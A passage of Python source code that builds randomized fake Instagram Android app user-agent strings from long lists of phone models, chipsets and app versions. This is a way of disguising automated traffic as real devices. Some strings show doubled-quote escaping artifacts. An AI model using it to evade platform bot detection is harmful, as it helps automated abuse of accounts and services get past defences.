Q421', 'Micromax Q417', 'Micromax Q426', 'Micromax Q4260', 'Micromax E311', 'Micromax E352', 'Micromax E455', 'Micromax Q415', 'Micromax Q355', 'Micromax Q469', 'Micromax E451', 'Micromax E451', 'Micromax Q340', 'Micromax Q349', 'Micromax Q345', 'Micromax Q450', 'Micromax Q480', 'arm_64 Micromax Q480', 'Micromax Q380', 'Micromax Q3502', 'Micromax Q351', 'Micromax Q385', 'P70221', 'Micromax P681', 'MicromaxP802', 'Micromax Q427', 'Micromax_Q427', 'Micromax Q413', 'Micromax E313', 'Micromax D2', 'Micromax D200', 'Micromax_D200', 'Micromax D303', 'Micromax D304', 'Micromax_D304', 'Micromax D305', 'Micromax D306', 'Micromax D320', 'Micromax D321', 'Micromax D333', 'Micromax D340', 'Micromax D7517', 'Micromax DM5003', 'Micromax E353', 'Micromax E457', 'Micromax E458', 'Micromax E460', 'Micromax E471', 'Micromax E4817', 'Micromax E482', 'Micromax E483', 'Micromax E5018M', 'Micromax EG111', 'Micromax EG116', 'micromax F', 'micromax F189', 'Micromax F601', 'MicromaxF666', 'Micromax IN', 'Micromax E7533', 'Micromax E6523', 'IN_2b', 'IN_Note1', 'MICROMAX IN1', 'N8216', 'N8301', 'ione note', 'MICROMAX ione note', 'Micromax N4120', 'Micromax N8202', 'Micromax Ninja', 'Micromax Nitro', 'Micromax Note 1+', 'Micromax Note 5', 'Micromax Note3', 'Micromax NX', 'Micromax P001', 'Micromax P250(Funbook)', 'Micromax P255', 'Micromax P256', 'xx Micromax P275', 'Micromax_P275', 'Micromax P275', 'Micromax P280', 'Micromax P290', 'Micromax P310', 'Micromax P350', 'xx Micromax P350', 'Micromax P360', 'Micromax P362', 'Micromax P365', 'Micromax P410', 'Micromax P410i', 'Micromax_P410i', 'Micromax P420', 'Micromax P469', 'Micromax P470', 'MicromaxP480', 'Micromax P500(Funbook)', 'Micromax P560', 'Micromax P580', 'Micromax P580i', 'Micromax P600', 'Micromax P650', 'Micromax P650E', 'Micromax P660', 'Micromax P660', 'Micromax_P666', 'Micromax P666', 'MicromaxP680', 'Micromax P690', 'Micromax P701', 'MicromaxP702', 'Micromax P810', 'en Micromax Q300', 'Micromax_Q300', 'Micromax Q323', 'Micromax_Q323', 'Micromax Q325', 'Micromax_Q325', 'Micromax Q331', 'Micromax_Q331', 'Micromax Q332', 'Micromax_Q332', 'Micromax Q334', 'Micromax Q335', 'Micromax_Q335', 'Micromax Q336', 'Micromax_Q336', 'Micromax Q341', 'Micromax Q343', 'Micromax Q348', 'Micromax_Q353', 'en Micromax_Q353', 'Micromax_Q353P', 'Micromax Q3551', 'Micromax Q3555', 'Micromax Q361', 'Micromax Q370', 'Micromax_Q370', 'Micromax Q371', 'Micromax_Q371', 'Micromax Q375', 'Micromax_Q375', 'Micromax Q379', 'Micromax Q381', 'Micromax Q382', 'Micromax Q386', 'Micromax Q394', 'Micromax_Q394', 'Micromax Q395', 'Micromax Q397', 'Micromax Q398', 'arm Micromax Q398', 'Micromax Q400', 'Micromax_Q400', 'Micromax Q4002', 'en Micromax Q4002', 'Micromax Q401', 'Micromax Q402', 'Micromax Q402 Ultra', 'Micromax Q404', 'Micromax Q411', 'Micromax_Q411', 'Micromax Q412', 'Micromax Q414', 'Micromax Q416', 'Micromax Q419', 'Micromax Q4201', 'Micromax Q422', 'Micromax Q4220', 'Micromax Q423', 'Micromax Q428', 'Micromax_Q428', 'Micromax Q429', '720X1280 Micromax Q4309', 'Micromax Q4312', 'en_US Micromax Q437', 'Micromax Q440Plus', 'Micromax Q454', 'Micromax Q470', 'Micromax Q479', 'Micromax Q491', 'Micromax_Q491', 'Micromax Q502+', 'Micromax Q666', 'Micromax Q67', 'micromax Q68', 'micromax Q78', 'Micromax S300', 'Micromax_S300', 'Micromax S301', 'Micromax_S301', 'Micromax Q4311', 'Micromax Q4601', 'Micromax Q409A', 'Micromax Q409', 'Micromax Q452', 'Micromax Unite 3', 'Micromax Unite 2', 'Micromax Unite 2 A106', 'Micromax Q372', 'Micromax V89', 'Micromax Q4001', 'Micromax Q4202', 'Micromax Q4251', 'arm Micromax Q4251', 'Micromax W5509', 'Micromax X5098', 'Micromax-Xzoom A52', 'YU5530', 'YU5040', 'Micromax YU5900', 'YU5012', 'Micromax Z59']
        self.onpls = ['NE2213', 'NE2217', 'NE2215', 'NE2210', 'NE2210', 'CPH2423', 'CPH2411', 'CPH2417', 'CPH2413', 'CPH2415', 'CPH2449', 'CPH2487', 'ONE A2003', 'ONE A2003', 'ONE A2001', 'ONE A2005', 'ONEPLUS A3003', 'ONEPLUS A3000', 'ONEPLUS A3010', 'ONEPLUS A5000', 'ONEPLUS A5000', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A6003', 'ONEPLUS A6000', 'ONEPLUS A6010', 'ONEPLUS A6013', 'ONEPLUS A6010', 'GM1900', 'GM1901', 'GM1903', 'GM1917', 'GM1913', 'GM1911', 'GM1910', 'GM1915', 'GM1910', 'HD1901', 'HD1903', 'HD1900 Flow', 'HD1905', 'HD1900', 'HD1907', 'HD1911', 'HD1913', 'HD1910', 'GM1925', 'HD1925', 'GM1920', 'IN2013', 'IN2015', 'IN2010', 'IN2010', 'IN2017', 'IN2019', 'IN2023', 'IN2025', 'IN2020', 'OnePlus8Pro', 'KB2005', 'KB2001', 'KB2007', 'KB2003', 'KB2000', 'OnePlus 8T 5G', 'LE2115', 'LE2113', 'LE2111', 'LE2110', 'LE2120', 'LE2125', 'LE2123', 'LE2121', 'LE2127', 'OnePlus9Pro', 'LE2101', 'LE2100', 'MT2111', 'MT2110', 'ONEPLUS A19677', 'ONEPLUS A2345', 'Oneplus A31', 'Oneplus A3331', 'ONEPLUS A35904', 'ONEPLUS A37000', 'ONEPLUS A3EVB', 'ONEPLUS A62322', 'ONEPLUS A64794', 'ONEPLUS A65369', 'ONEPLUS A68333', 'ONEPLUS A70458', 'ONEPLUS A70791', 'ONEPLUS A78637', 'ONEPLUS A80828', 'ONEPLUS A83306', 'ONEPLUS A87046', 'ONEPLUS A90641', 'Oneplus A99831', 'PGKM10', 'PGKM10', 'PHK110', 'PHK110', 'PGP110', 'PGP110', 'PGZ110', 'ONEPLUS KB2023', 'OnePlus Nord', 'Oneplus Nord 2', 'DN2103', 'DN2101', 'CPH2399', 'CPH2401', 'AC2001', 'AC2003', 'IV2201', 'CPH2409', 'CPH2381', 'CPH2465', 'EB2103', 'EB2101', 'EB2101', 'BE2025', 'BE2026', 'BE2029', 'Nord N10 5G', 'BE2028', 'BE2013', 'BE2011', 'BE2012', 'CPH2459', 'GN2200', 'CPH2469', 'DE2118', 'DE2117', 'A0001', 'ONE E1001', 'ONE E1003', 'ONE E1001', 'ONE E1005']
        self.oppo = [""CPH1869"", ""CPH1929"",""CPH2107"", ""CPH2238"", ""CPH2389"",""CPH2401"", ""CPH2407"", ""CPH2413"", ""CPH2415"", ""CPH2417"", ""CPH2419"", ""CPH2455"", ""CPH2459"", ""CPH2461"", ""CPH2471"", ""CPH2473"", ""CPH2477"", ""CPH8893"", ""CPH2321"", ""CPH2341"", ""CPH2373"", ""CPH2083"", ""CPH2071"", ""CPH2077"", ""CPH2185"", ""CPH2179"", ""CPH2269"", ""CPH2421"", ""CPH2349"", ""CPH2271"", ""CPH1923"", ""CPH1925"", ""CPH1837"", ""CPH2015"", ""CPH2073"", ""CPH2081"", ""CPH2029"", ""CPH2031"", ""CPH2137"", ""CPH1605"", ""CPH1803"", ""CPH1853"", ""CPH1805"", ""CPH1809"", ""CPH1851"", ""CPH1931"", ""CPH1959"", ""CPH1933"", ""CPH1935"", ""CPH1943"", ""CPH2061"", ""CPH2069"", ""CPH2127"", ""CPH2131"", ""CPH2139"", ""CPH2135"", ""CPH2239"", ""CPH2195"", ""CPH2273"", ""CPH2325"", ""CPH2309"", ""CPH1701"", ""CPH2387"", ""CPH1909"", ""CPH1920"", ""CPH1912"", ""CPH1901"", ""CPH1903"", ""CPH1905"", ""CPH1717"", ""CPH1801"", ""CPH2067"", ""CPH2099"", ""CPH2161"", ""CPH2219"", ""CPH2197"", ""CPH2263"", ""CPH2375"", ""CPH2339"", ""CPH1715"", ""CPH2385"", ""CPH1729"", ""CPH1827"", ""CPH1938"", ""CPH1937"", ""CPH1939"", ""CPH1941"", ""CPH2001"", ""CPH2021"", ""CPH2059"", ""CPH2121"", ""CPH2123"", ""CPH2203"", ""CPH2333"", ""CPH2365"", ""CPH1913"", ""CPH1911"", ""CPH1915"", ""CPH1969"", ""CPH2209"", ""CPH1987"", ""CPH2095"", ""CPH2119"", ""CPH2285"", ""CPH2213"", ""CPH2223"", ""CPH2363"", ""CPH1609"", ""CPH1613"", ""CPH1723"", ""CPH1727"", ""CPH1725"", ""CPH1819"", ""CPH1821"", ""CPH1825"", ""CPH1881"", ""CPH1823"", ""CPH1871"", ""CPH1875"", ""CPH2023"", ""CPH2005"", ""CPH2025"", ""CPH2207"", ""CPH2173"", ""CPH2307"", ""CPH2305"", ""CPH2337"", ""CPH1955"", ""CPH1707"", ""CPH1719"", ""CPH1721"", ""CPH1835"", ""CPH1831"", ""CPH1833"", ""CPH1879"", ""CPH1893"", ""CPH1877"", ""CPH1607"", ""CPH1611"", ""CPH1917"", ""CPH1919"", ""CPH1907"", ""CPH1989"", ""CPH1945"", ""CPH1951"", ""CPH2043"", ""CPH2035"", ""CPH2037"", ""CPH2036"", ""CPH2009"", ""CPH2013"", ""CPH2113"", ""CPH2091"", ""CPH2125"", ""CPH2109"", ""CPH2089"", ""CPH2065"", ""CPH2159"", ""CPH2145"", ""CPH2205"", ""CPH2201"", ""CPH2199"", ""CPH2217"", ""CPH1921"", ""CPH2211"", ""CPH2235"", ""CPH2251"", ""CPH2249"", ""CPH2247"", ""CPH2237"", ""CPH2371"", ""CPH2293"", ""CPH2353"", ""CPH2343"", ""CPH2359"", ""CPH2357"", ""CPH2457"", ""CPH1983"", ""CPH1979""]
        self.vivo = ['vivo 1002T', 'Vivo 1605', 'vivo 1730', 'vivo 1809', 'vivo_1820', 'vivo 1835', 'vivo 1914', 'vivo 2010', 'vivo 2019', 'vivo 2019', 'vivo 2019', 'vivo 2023', 'vivo 2027', 'vivo 3969', 'VIVO 5', 'Vivo 6', 'Vivo 7 Pro', 'Vivo 8', 'Vivo 93K Prime', 'vivo A5 ', 'vivo a54', 'Vivo A54', 'vivo a57', 'Vivo A87', 'VIVO A94', 'VIVO AIR', 'VIVO C8818', 'vivo E1', 'vivo E3', 'vivo E3', 'vivo E5', 'Vivo EGO', 'V1962BA', 'vivo h5', 'V1824A', 'V1824A', 'V1824BA', 'V2217A', 'V2217A', 'V2218A', 'V2218A', 'V2218A', 'V2243A', 'V1955A', 'I1927', 'I1928', 'V2024A', 'V2025A', 'V2025A', 'V2049A', 'V2049A', 'I2009', 'I2012', 'I2012', 'V2136A', 'V2136A', 'V2141A', 'V2171A', 'I2017', 'V2172A', 'V2172A', 'I2022', 'I2019', 'I2019', 'I2201', 'V1914A', 'V1914A', 'V1981A', 'V2055A', 'V2118A', 'V2157A', 'V2157A', 'V2154A', 'V2196A', 'V2196A', 'V2199A', 'V2231A', 'V2238A', 'V1936AL', 'V1936A', 'V1922A', 'V1922A', 'V1922A ', 'V1916A', 'V2023A', 'V2023A', 'VIVO V2023A', 'V2065A', 'V2061A', 'V2061A', 'V2143A', 'V2106A', 'V2165A', 'V2165A', 'V2180GA', 'V1986A', 'V2012A', 'V2012A', 'V2073A', 'V2073A', 'I2011', 'V2148A', 'I2018', 'V1919A', 'V2131A', 'V2220A', 'I2202', 'I2206', 'I2203', 'I2202', 'I2127', 'I2202', 'I2208', 'I2208', 'I2126', 'I2126', 'I2126', 'V2164KA', 'V2164KA', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'Vivo J5', 'vivo 1805', 'vivo 1805', 'vivo NEX', 'V1923A', 'vivo 1912', 'V1923A', 'vivo 1912', 'vivo 1913', 'V1924A', 'V1924A', 'vivo 1913', 'V1950A', 'V1950A', 'vivo NEX A', 'vivo NEX A', 'vivo 1813', 'V1821A', 'V1821A', 'vivo NEX S', 'vivo NEX S', 'Vivo ONE', 'Vivo ONE', 'PA2170', 'vivo PD1628F_EX', 'vivo PD1709', 'vivo PD1709F_EX', 'vivo PD1709F_EX', 'vivo PD1728', 'vivo PD1728', 'vivo PD1832F_EX', 'vivo PD2046F_EX', 'vivo PD2050F_EX', 'vivo PD2055F_EX', 'vivo PD2059F_EX', 'Vivo S', 'V1831A', 'V1831A', 'VIVO S1', 'Vivo S1 Prime', 'V1832A', 'V1832T', 'V2121A', 'V2121A', 'V2130A', 'V2130A', 'Vivo S11', 'Vivo S11 ', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S12', 'V2162A', 'Vivo S13', 'V2203A', 'V2207A', 'V2190A', 'V2244A', 'vivo S1Pro', 'Vivo S20 ', 'Vivo S21 ', 'Vivo S31', 'Vivo S4', 'Vivo S40', 'Vivo S41 /MMB439M', 'V1932A', 'vivo S6', 'V1962A', 'vivo S6T', 'V2020CA', 'V2020A', 'Vivo S76', 'V2031EA', 'vivo S7i(t)', 'vivo S7i(t)', 'vivo S7i(t)', 'V2080A', 'vivo S7t', 'vivo_S7t', 'vivo S7t', 'S7t 5G', 'vivo S7w', 'vivo S8', 'vivo S9', 'vivo S9', 'vivo S9', 'V2072A', 'V2048A', 'vivo S9t', 'V2168', 'V2168', 'V2153', 'V2153', 'V2150', 'V2151', 'V2151', 'V2151', 'V2143', 'vivo TD1602_EX', 'vivo U1', 'vivo 1916', 'vivo 1916', 'vivo 1921', 'V1941A', 'V1941A', 'V1928A', 'vivo V1', 'vivo V1', 'vivo V10', 'Vivo V10', 'VIVO V11', 'Vivo V11', 'vivo 1804', 'vivo 1804', 'vivo 1806', 'vivo 1806', 'vivo v11pro', 'vivo 1819', 'vivo 1818', 'vivo 1818', 'vivo 1920', 'vivo 1919', 'vivo 1907', 'vivo 1907', 'vivo 1907_19', 'vivo 1910', 'vivo 1909', 'vivo 1910', 'vivo 1933', 'vivo 1933', 'vivo V1907', 'vivo v19neo', 'vivo V1Max', 'vivo V1Max', 'vivo V2', 'V2040', 'vivo 2018', 'vivo 2018', 'V2022', 'Vivo V20A', 'Vivo V20G', 'V2066', 'V2108', 'V2050', 'V2050', 'V2050', 'V2061', 'V2055', 'Vivo V21S', 'V2130', 'V2132A', 'V2116', 'V2115', 'V2116', 'V2116', 'V2126', 'V2126', 'V2228', 'V2228', 'V2158', 'V2158', 'V2202', 'V2202', 'V2201', 'V2246', 'V2230', 'V2230', 'V2237', 'vivo V3', 'vivo V3', 'vivo V3Max A', 'vivo V3Max L', 'vivo v30', 'vivo v31', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3M A', 'vivo V3M A', 'vivo V3MA', 'vivo_V3Max', 'vivo v45', 'vivo 1601', 'vivo V5', 'vivo 1609', 'vivo 1611', 'Vivo V51', 'Vivo V54', 'vivo 1612', 'vivo 1713', 'vivo V5S A', 'vivo 1718', 'vivo 1716', 'vivo Y79A', 'vivo Y79A', 'V2166BA', 'Vivo V8', 'vivo 1723', 'vivo V9 mini', 'vivo 1851', 'VIVO V9Pro', 'vivo 1851', 'vivo 1727', 'Vivo X', 'V2178A', 'V2229A', 'V2170A', 'V2170A', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5S', 'vivo Xplay5S', 'vivo Xplay6', 'vivo Xplay6L', 'vivo Xplay6', 'vivo Xplay6', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X1', 'vivo X1', 'vivo X1', 'vivo X1', 'Vivo X11', 'vivo X1S', 'vivo X1S', 'vivo X1S', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1W', 'vivo X1w', 'VIVO X2', 'VIVO X2', 'VIVO_X2', 'vivo X20', 'vivo X20A', 'vivo X20Plus A', 'vivo 1720', 'vivo X20Plus UD', 'vivo X20Plus UD', 'vivo X21', 'vivo X21A', 'vivo X21UD A', 'vivo X21i', 'vivo X21i A', 'vivo X21i', 'vivo X21i A ', 'V1814A', 'V1814T', 'V1814T', 'V1814A', 'V1809A', 'V1809A', 'V1816A', 'V1809T', 'V1816T', 'V1829A', 'V1838A', 'V1838T', 'V1829T', 'V1836A', 'V1836A', 'V1836T', 'vivo X27Pro', 'V1938CT', 'V1938T', 'V1938T', 'vivo X3F', 'vivo X3F', 'vivo X3F', 'vivo X3L', 'vivo X3L', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'Vivo X40', 'vivo X5L', 'vivo X5', 'vivo X5L', 'vivo X5Pro D', 'vivo X5Pro L', 'vivo X5Pro V', 'vivo X5Pro D', 'vivo X5Pro D', 'V2001A', 'V2001A', 'vivo 2004', 'vivo 2005', 'vivo 2005', 'V1937', 'vivo 1937', 'V1937', 'V1937', 'vivo 2006', 'vivo 2006', 'V2005A', 'V2011A', 'X50 Pro+', 'V1930', 'V1930', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X520L', 'vivo X5F', 'vivo X5M', 'vivo X5M', 'vivo X5M', 'vivo X5Max ', 'vivo X5Max L', 'vivo X5Max L', 'vivo X5Max S', 'vivo X5Max V', 'vivo X5S L', 'vivo X5S L', 'vivo X5V', 'vivo X5V', 'vivo X5V', 'vivo X6D', 'vivo X6A', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus L', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus D', 'vivo X6Plus L', 'V2046A', 'V2059A', 'V2046A', 'V2045', 'V2046', 'V2047A', 'V2056A', 'V2085A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus A', 'vivo X7L', 'vivo X7Plus', 'vivo X7Plus', 'V2133A', 'V2104', 'V2104', 'V2105', 'V2134A', 'V2105', 'V2145A', 'V2114', 'V2145A', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'V2144', 'V2183A', 'V2144', 'V2208', 'V2185A', 'V2145', 'V2185A', 'Vivo X83', 'vivo X9', 'vivo X9L', 'vivo X9', 'vivo X9', 'vivo X9Plus', 'vivo X9Plus L', 'V2241A', 'V2242A', 'V2242A', 'V2227A', 'vivo X9i', 'vivo X9i', 'vivo X9i', 'vivo X9s', 'vivo X9s L', 'vivo X9s Plus', 'vivo X9s Plus', 'vivo X9s Plus L', 'vivo X9s Plus', 'VIVO XL', 'vivo Xplay', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 'V2203', 'V2221', 'Vivo y1', 'Vivo Y1', 'V2168A', 'V2168A', 'vivo 1906', 'V2028', 'vivo Y11t', 'vivo Y11t', 'vivo Y11t', 'vivo 1904', 'V2163A', 'V2102', 'V2102', 'vivo 2007', 'vivo 2007', 'Vivo Y12I Pro', 'V2026', 'V2042', 'V2033', 'V2039', 'V2069', 'V2026_21', 'vivo Y13L', 'vivo Y13', 'vivo Y13L', 'vivo Y13L', 'vivo Y13i', 'vivo_Y13i', 'vivo Y13iL', 'vivo Y13iL', 'vivo Y13T', 'vivo Y13T', 'vivo 1901', 'vivo Y15T', 'vivo Y15T', 'V2134', 'V2147', 'V2147', 'V2212', 'V2120', 'V2204', 'V2214', 'V2204', 'vivo 1902', 'vivo 1902_19', 'VIVO 1902', 'vivo Y17T', 'vivo Y17T', 'vivo_Y17T', 'vivo Y17T', 'vivo Y17W', 'vivo Y17W', 'vivo Y17W', 'vivo Y18L', 'vivo Y18L', 'vivo Y18L', 'vivo 1915', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'Vivo Y1i', 'vivo 2015', 'vivo 2015', 'V2029', 'V2027', 'V2043_21', 'V2101', 'V2070', 'V2054', 'V2052', 'V2037', 'V2032', 'V2038', 'V2038', 'V2129', 'V2129', 'V2111', 'V2149', 'V2140', 'V2140', 'V2152', 'V2152', 'V2110', 'V2110', 'V2131', 'V2135', 'V2207', 'vivo Y22iL', 'vivo Y22iL', 'V2206', 'V2206', 'vivo Y23L', 'vivo Y23L', 'vivo y23l', 'vivo Y23L', 'vivo Y23L', 'vivo Y23L', 'vivo 1613', 'vivo Y27', 'vivo Y27L', 'vivo Y27', 'vivo Y28', 'vivo Y28', 'vivo Y28L', 'vivo Y28L', 'vivo Y29L', 'vivo Y29L', 'vivo Y29L', 'V1901A', 'V1901A', 'V1901A', 'V1901T', 'V1930A', 'vivo 1938', 'V2034A', 'V2036A', 'V2099A', 'V2099A', 'V2160', 'V2160', 'V2160', 'V2066BA', 'V2066A', 'Y30g', 'Vivo Y30S', 'vivo Y31L', 'V2068', 'V2054A', 'V2068A', 'V2068', 'V2158A', 'Vivo Y32', 'V2180A', 'V2057', 'V2109', 'V2166A', 'V2166A', 'V2146', 'V2205', 'V2205', 'vivo Y37A', 'vivo Y37', 'V2044', 'vivo Y3t', 'vivo Y3t', 'vivo Y3t', 'vivo y41', 'vivo Y5 ', 'Vivo Y5', 'vivo 1935', 'VIVO Y50(2021)', 'V2023EA', 'Y50t', 'V2035', 'vivo Y51L', 'vivo Y51A', 'V2030', 'vivo 1707', 'V2031_21', 'vivo Y51t L', 'vivo Y51t L', 'vivo Y51t L', 'V2053', 'V2057A', 'vivo Y53', 'vivo 1606A', 'vivo Y53n', 'V2058', 'V2123A', 'V2069A', 'V2045A', 'V2045A', 'vivo Y55A', 'V2127', 'V2127', 'vivo 1603', 'vivo Y55n', 'vivo 1610', 'V2164A', 'V2164A', 'V1934A', 'V2006', 'vivo Y613', 'vivo Y613', 'vivo Y613F', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y623', 'vivo Y623', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y628', 'vivo Y628', 'vivo 1719', 'vivo Y66', 'vivo Y66L', 'vivo Y66i A', 'vivo Y67', 'vivo Y67A', 'vivo Y67L', 'vivo Y685', 'vivo 1714', 'vivo Y69A', 'V2002A', 'V2002A', 'vivo Y71A', 'vivo 1724', 'vivo Y71A', 'vivo 1801', 'V2041', 'V2060', 'V2102A', 'V1731CA', 'vivo Y73', 'Vivo Y73 /MMB239M', 'V2059', 'V2031A', 'V2164PA', 'V2117', 'vivo Y75A', 'V2142', 'V2142', 'vivo Y75s', 'vivo Y75s', 'vivo Y75S', 'vivo Y75s', 'V2124', 'V2156A', 'V2219A', 'V2219A', 'V2169', 'V2169', 'V1913A', 'vivo 1808i', 'vivo 1803', 'vivo 1803', 'vivo 1812', 'vivo Y81S', 'V1732A', 'V1732T', 'vivo Y83A', 'vivo 1802', 'vivo Y83A', 'vivo Y83A', 'vivo 1726', 'Vivo Y83I', 'vivo Y85A', 'vivo Y85', 'Vivo Y85i', 'Vivo Y86', 'V1730EA', 'vivo v1730ea', 'vivo 1908', 'vivo 1823', 'vivo 1908_19', 'vivo 1817', 'vivo 1811', 'vivo Y913', 'vivo Y913', 'vivo Y91C', 'vivo 1820', 'vivo 1816', 'vivo Y923', 'vivo Y923', 'vivo Y927', 'vivo Y927', 'vivo Y928', 'vivo Y928', 'vivo Y928', 'vivo 1814', 'V1818A', 'V1818A', 'vivo 1814', 'vivo Y937', 'vivo Y937', 'vivo Y937', 'V1818CT', 'V1818CA', 'vivo 1807', 'vivo Y95', 'V1813A', 'V1813T', 'V1813A', 'vivo Y97', 'V1945A', 'V1801A0', 'vivo Z1', 'vivo 1918', 'vivo 1951', 'vivo 1951', 'VIVO Z1Pro', 'vivo 1918', 'vivo 1918 Flow', 'Vivo Z10', 'vivo Z1i', 'V1730DA', 'V1730DT', 'vivo Z1i', 'vivo_1951', 'vivo 1917', 'V1813BA', 'V1813BT', 'V1813BT', 'Vivo Z34', 'vivo Z3x', 'V1730GA', 'vivo Z3x', 'vivo Z3x', 'V1921A', 'V1911A', 'V1911A', 'V1911A', 'V1990A', 'V1990A', 'V1963A', 'V1963A']
        self.infinix = [""Infinix X652B"", ""Infinix X680"", ""Infinix X690"", ""Infinix X625B"", ""Infinix X655"", ""Infinix X680B"", ""Infinix X652B"", ""Infinix X680"", ""Infinix X690"", ""Infinix X625B"", ""Infinix X655"", ""Infinix X680B"", ""Infinix X652B"", ""Infinix X680"", ""Infinix X690"", ""Infinix X625B"", ""Infinix X655"", ""Infinix X680B"", ""Infinix X652B"", ""Infinix X680"", ""Infinix X690"", ""Infinix X625B"", ""Infinix X655"", ""Infinix X680B"", ""Infinix X652B"", ""Infinix X680"", ""Infinix X690"", ""Infinix X625B"", ""Infinix X655"", ""Infinix X680B""]
        self.opp = random.choice([""OP4F97"", ""OP4BA5L1"", ""OP664D1"", ""OP5F11L1"", ""OP2A92"", ""OP8F17"", ""OP8F31"", ""OP4C9E1"", ""OP5B31"", ""OP4BA6L1"", ""OP2B87"", ""OP6F21"", ""OP6C8E1"", ""OP8F11"", ""OPPOA16"", ""OPPOA15"", ""OPPOA11"", ""OPPOA73"", ""OPPOA37"", ""OPPOA53"", ""OPPOA33"", ""OPPOA93"", ""OPPOA35"", ""OPPOA83"", ""OPPOA57"", ""OPPOA71"", ""OPPOA39"", ""OPPOA3"", ""OPPOA51"", ""OPPOA27"", ""OPPOA79""])
        self.trek = random.choice([""mt6769"", ""mt6768"", ""mt6767"", ""mt6765"", ""mt6763"", ""mt6757"", ""mt6755"", ""mt6753"", ""mt6739"", ""mt6737"", ""mt6735"", ""mt6595"", ""mt6582"", ""mt6572"", ""mt6571"", ""mt6570"", ""mt8563"", ""mt8167"", ""mt8163"", ""mt8135"", ""mt8127"", ""mt8125"", ""mt7623"", ""mt6797"", ""mt6592"", ""mt6590"", ""mt6580"", ""mt6573"", ""mt6575"", ""mt6260"", ""mt6236""])
        self.igversi = (""100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,79.0.0.21.101,78.0.0.11.104,77.0.0.20.113,76.0.0.15.395,75.0.0.23.99,74.0.0.21.99,73.0.0.22.185,72.0.0.21.98,71.0.0.18.102,70.0.0.22.98,69.0.0.30.95,68.0.0.11.99,67.0.0.25.100,66.0.0.11.101,65.0.0.12.86,64.0.0.14.96,63.0.0.17.94,62.0.0.19.93,61.0.0.19.86,60.1.0.17.79,59.0.0.23.76,58.0.0.12.73,57.0.0.9.80,56.0.0.13.78,55.0.0.12.79,54.0.0.14.82,53.0.0.13.84,52.0.0.8.83,51.0.0.20.85,50.1.0.43.119,271.1.0.21.84,131.0.0.23.11,130.0.0.31.12,128.0.0.26.12,126.0.0.25.12,125.0.0.20.12,124.0.0.17.47,123.0.0.21.11,122.0.0.29.23,120.0.0.29.11,119.0.0.33.14,118.0.0.28.12,117.0.0.28.12,115.0.0.26.11,114.0.0.38.12,113.0.0.39.12,112.0.0.29.12,111.1.0.25.15,110.0.0.16.11,109.0.0.18.12,108.0.0.23.11,107.0.0.27.12,106.0.0.24.11,105.0.0.18.11,104.0.0.21.11,103.1.0.15.11,102.0.0.20.11,101.0.0.15.12,100.0.0.17.12,99.0.0.32.182,98.0.0.15.119,97.0.0.32.119"").split(',')
        self.dix = random.choice(self.igversi)
        self.dpi_pxl = random.choice(['240dpi; 1760x792', '240dpi; 1920x864', '320dpi; 2400x1080', '400dpi; 3200x1440', '480dpi; 1080x1920', '320dpi; 900x1600', '320dpi; 720x1280', '240dpi; 540x960', '280dpi; 1920x1080', '240dpi; 160x900', '240dpi; 1280x720', '160dpi; 960x540','160dpi; 623x1280'])
        self.dpi = random.choice([""133"",""320"",""515"",""160"",""640"",""240"",""120"",""800"",""480"",""225"",""768"",""216"",""1024""])
        self.pxl = random.choice([""1080x2161"",""1080x2158"",""1080x2290"",""720x1448"",""1080x2264"",""623x1280"",""700x1245"",""800x1280"",""1080x2340"",""1320x2400"",""1242x2688""])
        self.dvc = random.choice([""30/11"",""31/12"",""29/10""])
        return(random.choice([
             f'Instagram {self.dix} Android ({self.dvc}; 160dpi; 623x1280; INFINIX MOBILITY LIMITED/Infinix; {str(random.choice(self.infinix))}; qcom; in_ID; 158441914)',
            f'Instagram {self.dix} Android ({self.dvc}; 160dpi; 623x1280; NEXUS MOBILITY LIMITED/Nexus; {str(random.choice(self.nexus))}; qcom; in_ID; 158441914)',
            f'Instagram {self.dix} Android ({self.dvc}; 160dpi; 623x1280; MICROMAX MOBILITY LIMITED/Micromax; {str(random.choice(self.micromax))}; qcom; in_ID; 158441914)',
            f'Instagram {self.dix} Android ({self.dvc}; 160dpi; 623x1280; ONEPLUS MOBILITY LIMITED/One; {str(random.choice(self.onpls))}; qcom; in_ID; 158441914)',
            f'Instagram {self.dix} Android ({self.dvc}; 160dpi; 623x1280; OPPO MOBILITY LIMITED/Oppo; {str(random.choice(self.oppo))}; {self.opp}; qcom; in_ID; 158441914)',
            f'Instagram {self.dix} Android ({self.dvc}; 160dpi; 623x1280; VIVO MOBILITY LIMITED/Vivo; {str(random.choice(self.vivo))}; qcom; in_ID; 158441914)',
           ])
       )
        
    def useragent_ajax(self):
        self.chrome = str(random.randint(114,124))
